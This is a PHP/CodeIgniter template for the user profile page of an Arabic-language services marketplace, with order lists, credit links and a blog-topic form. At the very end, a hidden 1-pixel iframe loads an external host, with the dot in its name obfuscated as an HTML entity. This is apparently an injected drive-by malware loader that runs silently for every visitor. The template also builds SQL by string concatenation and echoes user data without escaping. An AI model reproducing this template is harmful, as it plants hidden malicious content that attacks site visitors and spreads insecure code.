<!DOCTYPE HTML>
<html>
    <head>
        <meta http-equiv="Content-type" content="text/html; charset=utf-8">
        <title>شلينات دوت كوم</title>

        <meta name="keywords" content="content">

        <meta name="viewport" content="width=device-width; initial-scale=1.0">		


        <link rel="stylesheet" href="<?php echo base_url(); ?>css/stylesheet.css" type="text/css" media="screen">
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/angelina.css" type="text/css" >		
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/flexslider.css" type="text/css" >		
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/prettyPhoto.css" type="text/css" >	
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/style.css" type="text/css" media="screen">
        <!-- template skin -->
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/skin.css"type="text/css" >	

        <link href="<?php echo base_url(); ?>css/ticker-style.css" rel="stylesheet" type="text/css" />

        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
        <script src="<?php echo base_url(); ?>js/jquery.easing.1.3.js" type="text/javascript" ></script>

        <!-- FlexSlider -->	
        <script src="<?php echo base_url(); ?>js/jquery.flexslider.js" type="text/javascript" ></script> 	
        <script src="<?php echo base_url(); ?>js/function.js" type="text/javascript" ></script> 
        <script src="<?php echo base_url(); ?>js/custom.js" type="text/javascript" ></script> 
        <!-- Ticker -->	
        <script src="<?php echo base_url(); ?>js/ticker.js" type="text/javascript" ></script> 	
        <script src="<?php echo base_url(); ?>js/setting.js"  type="text/javascript" ></script> 

        <!-- prettyPhoto -->	
        <script src="<?php echo base_url(); ?>js/jquery.prettyPhoto.js" type="text/javascript" ></script> 	
        <script src="<?php echo base_url(); ?>js/setting-1.js"type="text/javascript"  ></script> 

        <!-- ui totop -->	
        <script src="<?php echo base_url(); ?>js/smoothscroll.js"  type="text/javascript" ></script>
        <script src="<?php echo base_url(); ?>js/jquery.ui.totop.js"  type="text/javascript"></script>

        <script src="<?php echo base_url(); ?>js/jquery.ticker.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>js/site.js" type="text/javascript"></script>
        <?php include 'tempelet/ajax.php'; ?>


    </head>
    <style type="text/css">
        a:hover {
            text-decoration:underline;
        }
    </style>
    <body>

        <!-- start of wrapper -->
        <div id="wrapper">

            <!-- start of section top -->
            <section id="top">
                <div id="top-wrapp">
                    <?php include('header.php') ?>
                    <?php include 'dbcon_blog.php'; ?>
                    <?php include 'tempelet/news.php'; ?>
                </div>
            </section>
            <!-- end of section top -->

            <!-- start of section middle -->
            <div id="content">
                <div id="left">
                    <div id="profile_half1">




                        <img src="<?php echo base_url(); ?>images/profile/thumb_profile/<?php
                    if (isset($pic)) {
                        echo $pic;
                    }
                    ?>"   class="user_profile" width="190" height="160" />                  


                        <table width="400" id="user_data" border="">
                            <tr>
                                <td> <p id="user_name">
                                        <a href="<?php echo base_url(); ?>user/visit_profile/<?php
                             if (isset($user_id)) {
                                 echo $user_id;
                             }
                    ?>">
                                               <?php
                                               if (isset($username)) {
                                                   echo $username;
                                               }
                                               ?>
                                    </p></td>
                            </tr>
                            <tr>
                                <td>  
                                    <?php
                                    if (isset($owner)) {
                                        if ($owner == 'yes') {
                                            ?>
                                            <a href="<?php echo base_url(); ?>user/show_messages"  id="message"><span style="color:#F90">3</span> صندوق الرسائل</a>
                                        <?php } else { ?>
                                            <a href="<?php echo base_url(); ?>user/messages/<?php
                                    if (isset($recev_id)) {
                                        echo $recev_id;
                                    }
                                            ?>"  id="message"> ارسال رساله</a>
                                               <?php
                                           }
                                       }
                                       ?>
                                </td>
                            </tr>
                            <tr>
                                <?php
                                if (isset($owner)) {
                                    if ($owner == 'yes') {
                                        ?>
                                        <td><a href="<?php echo base_url(); ?>user/edit_profile" id="edit">تعديل حسابي الشخصي</a></td>
                                        <?php
                                    }
                                }
                                ?>
                            </tr>

                            <tr>
                                <td>  <a href="<?php echo base_url(); ?>user/user_tree/<?php
                                if ($this->session->userdata('user_id')) {
                                    echo $this->session->userdata('user_id');
                                }
                                ?>" id="message">شجره الاعضاء</a></td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="<?php echo base_url('payment/addCreditPage') ?>" > ايداع رصيد</a>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="" > سحب  رصيد</a>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="<?php echo base_url('payment/convertFromCreditToShelinat') ?>" >  تحويل من رصيد لشلنات </a>
                                </td>

                            </tr>
                            <tr>
                                <?php
                                if (isset($owner)) {
                                    if ($owner == 'yes') {
                                        ?>
                                        <td>
                                            <?php echo form_open_multipart('user/upload_pic'); ?>


                                            <div id='file_browse_wrapper'>
                                                <?php echo form_upload(array('id' => 'file_browse', 'name' => 'userfile')); ?>
                                            </div>


                                            <?php echo form_submit(array('id' => 'upload_button', 'name' => 'post_upload2'), 'تحميل'); ?>
                                            <?php echo form_close(); ?></td>
                                        <?php
                                    }
                                }
                                ?> 
                            </tr>
                        </table>

                        <div id="clear"></div>


                        <div id="clear"></div>

                        <div class="heading center" style="background-color:transparent">
                            <div class="dotted"></div>
                            <h4><span class="bold" style="color:#fff">خدمات تم حجزها ولم تنفذ بعد</span></h4>
                            <div class="dotted"></div>
                            <?php
                            $sql = "SELECT order.id as order_id,photo_name,name,price_point,e_id FROM `order` INNER JOIN `user` ON order.u_id = user.id INNER JOIN `service` ON order.s_id = service.id  where order.statu=0 and user.id=";
                            if ($this->session->userdata('user_id')) {
                                $sql.=$this->session->userdata('user_id');
                                $sql.=' ORDER BY `order`.`start` DESC';
                            }
                            $q = $this->db->query($sql);
                            if ($q->num_rows() > 0) {
                                $res = $q->result();
                                include 'tempelet/user_orders.php';
                            }
                            ?>

                        </div>

                        <div class="clear"></div>
                        <div class="heading center" style="background-color:transparent">
                            <div class="dotted"></div>
                            <h4><span class="bold" style="color:#fff">خدمات تم حجزها وجارى  تنفذها </span></h4>
                            <div class="dotted"></div>
                            <?php
                            $sql = "SELECT order.id as order_id,photo_name,name,price_point,e_id FROM `order` INNER JOIN `user` ON order.u_id = user.id INNER JOIN `service` ON order.s_id = service.id  where order.statu=1 and user.id=";
                            if ($this->session->userdata('user_id')) {
                                $sql.=$this->session->userdata('user_id');
                                $sql.=' ORDER BY `order`.`start` DESC';
                            }
                            $q = $this->db->query($sql);
                            if ($q->num_rows() > 0) {
                                $res = $q->result();
                                include 'tempelet/user_orders.php';
                            }
                            ?>

                        </div>
                        <div class="clear"></div>
                        <div class="clear"></div>
                        <div class="heading center" style="background-color:transparent">
                            <div class="dotted"></div>
                            <h4><span class="bold" style="color:#fff">خدمات تم الأنتهاء من تنفيذها  </span></h4>
                            <div class="dotted"></div>
                            <?php
                            $sql = "SELECT order.id as order_id,photo_name,name,price_point,e_id FROM `order` INNER JOIN `user` ON order.u_id = user.id INNER JOIN `service` ON order.s_id = service.id  where order.statu=2 and user.id=";
                            if ($this->session->userdata('user_id')) {
                                $sql.=$this->session->userdata('user_id');
                                $sql.=' ORDER BY `order`.`start` DESC';
                            }
                            $q = $this->db->query($sql);
                            if ($q->num_rows() > 0) {
                                $res = $q->result();
                                include 'tempelet/user_orders.php';
                            }
                            ?>

                        </div>
                        <div class="clear"></div>
                        <div class="dotted"></div>
                        <table width="450" border="0" style="float:right;text-align:right;margin-right:-20px;">
                            <tr>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                            </tr>
                        </table>

                        <div id="clear"></div>

                        <?php
                        if (isset($owner)) {
                            if ($owner == 'yes') {
                                ?>
                                <?php echo form_open_multipart('user/validation_add_topic'); ?>

                                <div class="heading center" style="background-color:transparent">
                                    <div class="dotted"></div>
                                    <h4><span class="bold" style="color:#fff">لاضافه موضوع الي المدونه</span></h4>
                                    <div class="dotted"></div>
                                </div>
                                <div style="color:#FC3;margin-right:140px;">
                                    <?php
                                    if (isset($topic_added)) {
                                        echo '<p style="margin-left:30px;color:#3C3;font-size:16px;font-weight:bold;">' . $topic_added . '</p>';
                                    } else {
                                        echo validation_errors();
                                    }
                                    ?></div>


                                <table width="790" border="0" id="topic">
                                    <tr>
                                        <td>

                                            <div id='file_browse_wrapper2'>
                                                <?php echo form_upload(array('id' => 'file_browse2', 'name' => 'userfile')); ?>
                                            </div>
                                        </td>
                                        <td><p>صوره الموضوع</p></td>
                                    </tr>
                                    <tr>

                                        <td width="604"> <?php echo form_input(array('name' => 'topic_name', 'id' => "name", 'value' => $this->input->post('username'))); ?></td>
                                        <td width="136"><p style="position:absolute;margin-top:10px;float:right;margin-left:50px;">عنوان الموضوع</p></td>
                                    </tr>

                                    <tr>

                                        <td> <?php echo form_textarea(array('name' => 'topic', 'id' => "email", 'value' => $this->input->post('email'))); ?></td>
                                        <td><p style="position:absolute;margin-top:10px;float:right;margin-left:80px;">الموضوع</p></td>
                                    </tr>

                                    <tr>

                                        <td> <?php echo form_textarea(array('name' => 'tags', 'id' => "email", 'value' => $this->input->post('tags'))); ?></td>
                                        <td><p style="position:absolute;margin-top:10px;float:right;margin-left:80px;">الوسوم</p></td>
                                    </tr>
                                    <tr>

                                        <td>
                                            <div class="both" style="margin-left:113px;">



                                                <select name="search_category"  id="search_category_id">
                                                    <option value="none" selected="selected" >اختار القسم الرئيسى</option>
                                                    <?php
                                                    $query = "select * from blog_category";
                                                    $results = mysql_query($query);
                                                    while ($rows = mysql_fetch_assoc(@$results)) {
                                                        ?>
                                                        <option value="<?php echo $rows['id']; ?>"><?php echo $rows['name']; ?></option>
                                                    <?php }
                                                    ?>
                                                </select>		
                                            </div>

                                            <div class="both" style="margin-left:0px;">
                                                <div id="show_sub_categories" align="center">
                                                    <img src="<?php echo base_url(); ?>images/loader.gif" style="margin-top:8px; float:left" id="loader" alt="" />
                                                </div>
                                            </div>
                                            <br clear="all" /><br clear="all" />
                                        </td>
                                        <td>

                                            <p> القسم</p>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input type="hidden" name="usertype" value="user"/> 
                                        </td>
                                    </tr>
                                </table>


                                <div class="centerdiv">
                                    <div class="cta-button optin small">

                                        <button type="submit" class="cta1">اضافه</button>
                                        <span class="text" style="width:370px;"> سيتم اضافه الموضوع تلقائيا الي المدونه بعد الضغط علي زر الاضافه للموضوع</span>


                                    </div>
                                </div>
                                <?php echo form_close(); ?>
                                <?php
                            }
                        }
                        ?> 
                        <div id="clear"></div>
                        <div class="heading center" style="background-color:transparent">
                            <div class="dotted"></div>
                            <h4><span class="bold" style="color:#fff">الموضوعات التي تم اضافتها الي المدونه</span></h4>
                            <div class="dotted"></div>
                        </div>
                        <table width="450" border="0" style="margin:auto">
                            <tr>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                                <td>
                                    <div id="most">
                                        <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                        <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                        <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                                    </div>
                                </td>
                            </tr>
                        </table>




                    </div>
                </div>




                <div id="right" style="display:block">
                    <?php include 'tempelet/main_menu.php'; ?>
                    <div id="clear"></div>
                    <?php include 'tempelet/righ.php'; ?>
                </div>

            </div>


            <!-- end of section middle -->

            <!-- start of section bottom -->
            <?php include('footer.php') ?>
            <!-- end of section bottom -->

        </div>
        <!-- end of wrapper -->

    <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>